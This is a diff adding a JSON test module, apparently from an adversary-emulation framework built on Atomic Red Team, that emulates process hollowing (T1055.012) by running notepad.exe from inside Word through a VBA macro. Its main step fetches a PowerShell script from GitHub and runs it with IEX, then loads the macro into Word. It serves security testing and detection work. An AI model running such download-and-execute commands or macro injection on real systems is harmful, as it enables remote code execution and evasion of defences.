@@ -1,0 +1,86 @@
+{
+  "id": "3ad4a037-1598-4136-837c-4027e4fa319b",
+  "name": "RunPE via VBA",
+  "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "15f00158-2f5f-4ac8-b5ad-128344831f7e",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a8f3fd62-3a34-4965-a18c-ba53615e1fa4",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bde30715-14df-476c-995c-9bda5283bc3f",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b4a41dc0-3524-42fe-86aa-8fea2ac359f0",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a8f3fd62-3a34-4965-a18c-ba53615e1fa4",
+      "p": "on-success",
+      "o": "15f00158-2f5f-4ac8-b5ad-128344831f7e"
+    },
+    {
+      "s": "a8f3fd62-3a34-4965-a18c-ba53615e1fa4",
+      "p": "on-failure",
+      "o": "bde30715-14df-476c-995c-9bda5283bc3f"
+    },
+    {
+      "s": "bde30715-14df-476c-995c-9bda5283bc3f",
+      "p": "on-success",
+      "o": "b4a41dc0-3524-42fe-86aa-8fea2ac359f0"
+    },
+    {
+      "s": "b4a41dc0-3524-42fe-86aa-8fea2ac359f0",
+      "p": "on-failure",
+      "o": "15f00158-2f5f-4ac8-b5ad-128344831f7e"
+    }
+  ],
+  "tags": [
+    "T1055.012",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "ms_product",
+      "type": "string",
+      "description": "Maldoc application Word",
+      "value": "Word"
+    }
+  ]
+}
